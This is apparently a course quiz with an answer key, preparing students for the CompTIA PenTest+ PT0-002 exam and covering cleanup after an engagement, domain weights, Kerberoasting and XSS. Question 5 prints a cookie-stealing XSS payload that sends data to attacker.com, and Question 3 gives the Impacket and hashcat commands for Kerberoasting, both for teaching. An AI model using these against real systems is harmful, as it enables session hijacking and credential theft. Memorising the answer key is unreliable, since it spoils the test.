# Quiz: Module 16 - Final Exam Prep & CompTIA PenTest+ PT0-002 Certification
## Course: CIS-4333_Penetration_Testing (CompTIA PenTest+)

---

**Question 1**
A penetration tester has completed all testing activities against a client's environment. Before submitting the final report, the tester removes all Meterpreter sessions, deletes uploaded tools, removes the backdoor user account created during privilege escalation testing, and provides the client a written statement confirming all artifacts have been cleared. What is the term for this final engagement phase, and why is it required?

*   A) Scope validation — required to confirm that all systems tested were within the agreed Rules of Engagement boundary.
*   B) Post-engagement cleanup and attestation — required to ensure all persistence mechanisms, shells, tools, and accounts placed during testing are removed so real attackers cannot leverage tester artifacts after the engagement ends.
*   C) Risk acceptance documentation — required to record which findings the client has formally chosen not to remediate before the engagement closes.
*   D) Vulnerability verification — required to confirm that all reported findings are genuine vulnerabilities and not false positives introduced by automated scanning tools.
*   **Correct Answer:** B) Post-engagement cleanup and attestation — required to ensure all persistence mechanisms, shells, tools, and accounts placed during testing are removed so real attackers cannot leverage tester artifacts after the engagement ends.
*   **Distractor Analysis:**
    *   *Why B is correct:* Post-engagement cleanup is a mandatory final phase of every professional penetration test. Backdoors, shells, and created accounts are fully functional attack tools — if left in place, a real attacker who later accesses the same network could exploit them. Written attestation confirms the tester has fulfilled this obligation, protecting both the tester and the client legally. PT0-002 tests cleanup as an explicit phase, not an afterthought. This topic was covered in Module 15 (Reporting).
    *   *Why A is incorrect:* Scope validation occurs at the beginning of the engagement during planning and scoping — not after testing activities have concluded. It confirms what is and is not authorized before any testing begins, not after.
    *   *Why C is incorrect:* Risk acceptance documentation occurs when a client reviews findings and formally decides not to remediate a specific vulnerability. It is part of the reporting phase and is client-driven — it is not the same as cleanup attestation, which is tester-driven.
    *   *Why D is incorrect:* Vulnerability verification (distinguishing true positives from false positives) is an analysis step that occurs during the vulnerability scanning and exploitation phases, well before reporting or cleanup. It is not the name or function of the post-engagement closing phase.

---

**Question 2**
Which of the following correctly states the PT0-002 exam domain weights, listed from largest to smallest?

*   A) Planning & Scoping 30%, Information Gathering & Vulnerability Scanning 22%, Attacks & Exploits 18%, Reporting & Communication 16%, Tools & Code Analysis 14%.
*   B) Attacks & Exploits 30%, Information Gathering & Vulnerability Scanning 22%, Reporting & Communication 18%, Tools & Code Analysis 16%, Planning & Scoping 14%.
*   C) Information Gathering & Vulnerability Scanning 30%, Attacks & Exploits 22%, Tools & Code Analysis 18%, Reporting & Communication 16%, Planning & Scoping 14%.
*   D) Attacks & Exploits 25%, Reporting & Communication 25%, Information Gathering & Vulnerability Scanning 20%, Planning & Scoping 15%, Tools & Code Analysis 15%.
*   **Correct Answer:** B) Attacks & Exploits 30%, Information Gathering & Vulnerability Scanning 22%, Reporting & Communication 18%, Tools & Code Analysis 16%, Planning & Scoping 14%.
*   **Distractor Analysis:**
    *   *Why B is correct:* The five PT0-002 exam domains and their weights are: Attacks & Exploits (30%) — the largest domain covering exploitation, post-exploitation, privilege escalation, lateral movement, social engineering, wireless, web application, and cloud attacks; Information Gathering & Vulnerability Scanning (22%); Reporting & Communication (18%); Tools & Code Analysis (16%); Planning & Scoping (14%) — the smallest domain. Memorizing these weights helps candidates allocate study time proportionally and recognize which domain a scenario question belongs to.
    *   *Why A is incorrect:* This option inverts the domain weights — assigning 30% to Planning & Scoping (the smallest domain) and only 14% to Attacks & Exploits (the largest). These are reversed and would lead to severe misallocation of study effort.
    *   *Why C is incorrect:* This option inflates Information Gathering & Vulnerability Scanning to 30% and reduces Attacks & Exploits to 22%. While Information Gathering is the second-largest domain, it does not outweigh Attacks & Exploits. The ordering and weights in this option are incorrect.
    *   *Why D is incorrect:* This option splits the top two domains evenly at 25% each, which does not reflect the actual PT0-002 weighting. Reporting & Communication is not tied for first at 25% — it is the third-largest domain at 18%. These figures are fabricated and do not match CompTIA's published exam objectives.

---

**Question 3**
A penetration tester is given a set of captured Kerberos TGS tickets from a Windows domain environment. The tester wants to crack the service account passwords offline. Which sequence of steps correctly describes the Kerberoasting attack and the appropriate tool to use?

*   A) Use `aircrack-ng -w rockyou.txt` against the captured tickets — Kerberos tickets use WPA2-style PBKDF2 key derivation and require the same dictionary cracking approach as wireless handshakes.
*   B) Run `sqlmap --dump` against the domain controller's LDAP port (389) to extract hashed service account passwords directly from Active Directory.
*   C) Use `GetUserSPNs.py -request` from the Impacket suite to request TGS tickets for accounts with SPNs, then crack the RC4-encrypted tickets offline using `hashcat -m 13100` with a dictionary or rule-based attack.
*   D) Use `hydra -l svc_account -P rockyou.txt ldap://dc.corp.local` to brute-force service account credentials directly against Active Directory's authentication interface.
*   **Correct Answer:** C) Use `GetUserSPNs.py -request` from the Impacket suite to request TGS tickets for accounts with SPNs, then crack the RC4-encrypted tickets offline using `hashcat -m 13100` with a dictionary or rule-based attack.
*   **Distractor Analysis:**
    *   *Why C is correct:* Kerberoasting exploits the fact that any authenticated domain user can request TGS tickets for service accounts that have Service Principal Names (SPNs) registered. These tickets are encrypted with the service account's NTLM hash (RC4 encryption by default). `GetUserSPNs.py -request` from Impacket requests and captures these tickets. Hashcat mode `-m 13100` specifically handles Kerberos 5 TGS-REP etype 23 hashes — the format produced by Kerberoasting. The cracked password belongs to the service account, not to the requesting user. This is a purely offline attack — no authentication attempts are made against Active Directory during cracking.
    *   *Why A is incorrect:* Kerberos TGS tickets are not WPA2 handshakes and are not cracked with `aircrack-ng`. Aircrack-ng is a wireless tool that cracks WPA2 PSK handshakes using PBKDF2-HMAC-SHA1. Kerberos tickets use RC4 or AES encryption and require a different cracking tool and hash mode entirely.
    *   *Why B is incorrect:* `sqlmap` is a SQL injection tool designed for web application databases. It does not interact with LDAP, Active Directory, or Kerberos. There is no `--dump` functionality that extracts domain credentials from a domain controller's LDAP port.
    *   *Why D is incorrect:* `hydra` performs online brute-force authentication attacks — it attempts live logins against a service. Online attacks against Active Directory risk triggering account lockout policies and generate significant authentication logs. Kerberoasting is specifically valuable because it is an offline attack that does not generate failed login events.

---

**Question 4**
On the PT0-002 exam, a performance-based question (PBQ) appears as the first question. The tester has spent 25 minutes on it and is still unsure of the answer. What is the recommended exam strategy?

*   A) Continue working on the PBQ until it is answered correctly — PBQs are worth significantly more points than multiple-choice questions, and leaving them blank results in an automatic score penalty.
*   B) Flag the PBQ and move on to the multiple-choice questions — PBQs often become clearer after answering related multiple-choice questions, and completing the easier questions first ensures maximum point accumulation before time runs out.
*   C) Skip directly to the reporting domain questions first since Reporting & Communication (18%) has the highest point density relative to study time investment for most candidates.
*   D) Request a test accommodation extension from the proctor — CompTIA allows candidates to pause the timer once per exam session for extended PBQ consideration.
*   **Correct Answer:** B) Flag the PBQ and move on to the multiple-choice questions — PBQs often become clearer after answering related multiple-choice questions, and completing the easier questions first ensures maximum point accumulation before time runs out.
*   **Distractor Analysis:**
    *   *Why B is correct:* PT0-002 best practice is to flag difficult PBQs at the beginning and return to them after completing the multiple-choice section. PBQs appear at the start of the exam and can consume disproportionate time if the tester is unfamiliar with the simulated scenario. Multiple-choice questions that follow often reference the same concepts as the PBQ, and answering them can reinforce or clarify the correct approach. With 165 minutes and up to 85 questions, time management is critical — spending 40+ minutes on one PBQ while rushing through 80 multiple-choice questions is a high-risk strategy.
    *   *Why A is incorrect:* CompTIA does not publish individual question point values, and PBQs are not confirmed to carry more weight than multiple-choice questions on PT0-002. There is no automatic penalty for flagging and returning to a question. Spending unlimited time on one question while depleting the time budget for the rest of the exam is a poor strategy regardless of perceived question weight.
    *   *Why C is incorrect:* There is no exam interface feature to jump directly to questions by domain. Questions appear in the sequence set by the exam delivery system. Additionally, sorting questions by domain weighting to optimize study time is a study strategy — not a valid exam-day navigation strategy during a timed session.
    *   *Why D is incorrect:* CompTIA does not allow candidates to pause the exam timer during a live testing session. Test accommodations (such as extended time) must be requested and approved before exam registration — they are not available as an in-session option requested from the proctor.

---

**Question 5**
A PT0-002 exam scenario describes a tester who has completed a web application assessment and discovered that the client's application reflects user input directly in HTTP responses without sanitization. The tester crafted the payload `<script>document.location='http://attacker.com/steal?c='+document.cookie;</script>` and confirmed it executes in the victim's browser when they visit a specific page. Which vulnerability type, CVSS severity characteristic, and PT0-002 domain does this finding primarily fall under?

*   A) SQL Injection — Critical severity because it allows database extraction — Information Gathering & Vulnerability Scanning domain.
*   B) Stored Cross-Site Scripting (XSS) — High severity if persistently stored, allowing session hijacking across all users — Attacks & Exploits domain.
*   C) Reflected Cross-Site Scripting (XSS) — typically Medium to High severity — Attacks & Exploits domain (30%), with the finding documented in the Reporting & Communication domain (18%).
*   D) Server-Side Request Forgery (SSRF) — Critical severity because it allows internal network access and IMDS credential theft — Tools & Code Analysis domain.
*   **Correct Answer:** C) Reflected Cross-Site Scripting (XSS) — typically Medium to High severity — Attacks & Exploits domain (30%), with the finding documented in the Reporting & Communication domain (18%).
*   **Distractor Analysis:**
    *   *Why C is correct:* The scenario describes reflected XSS — unsanitized user input reflected directly in HTTP responses that executes in the victim's browser when they visit a specific crafted URL. The payload steals session cookies via `document.cookie`, enabling session hijacking. Reflected XSS typically scores Medium to High on CVSS v3.1 depending on the user interaction required (the victim must visit a crafted link). The attack technique is covered under the Attacks & Exploits domain (30%), and once confirmed, the finding must be documented — including CVSS score, affected URL, evidence, business impact (account takeover, credential theft), and remediation (output encoding, Content Security Policy) — in the Reporting & Communication domain (18%). PT0-002 expects candidates to link attack identification with reporting obligations.
    *   *Why A is incorrect:* SQL Injection involves injecting SQL syntax into database queries — not injecting JavaScript into HTTP responses. The payload shown (`<script>`) is JavaScript, not SQL. SQL injection findings do not execute in the victim's browser; they manipulate database queries server-side.
    *   *Why B is incorrect:* Stored XSS would require the malicious script to be saved persistently in the application's database and served to all users who load the affected page — without requiring a specially crafted URL. The scenario specifies the payload executes when the victim visits "a specific page" after receiving a crafted link, which is the defining characteristic of reflected XSS, not stored XSS. Stored XSS is generally considered higher severity because it does not require social engineering each victim individually.
    *   *Why D is incorrect:* SSRF (Server-Side Request Forgery) forces the server itself to make HTTP requests to internal resources such as the IMDS at 169.254.169.254. The scenario describes client-side JavaScript execution in the victim's browser — not a server-side request. SSRF and XSS are distinct vulnerability classes with different attack surfaces, exploitation mechanisms, and remediation approaches.
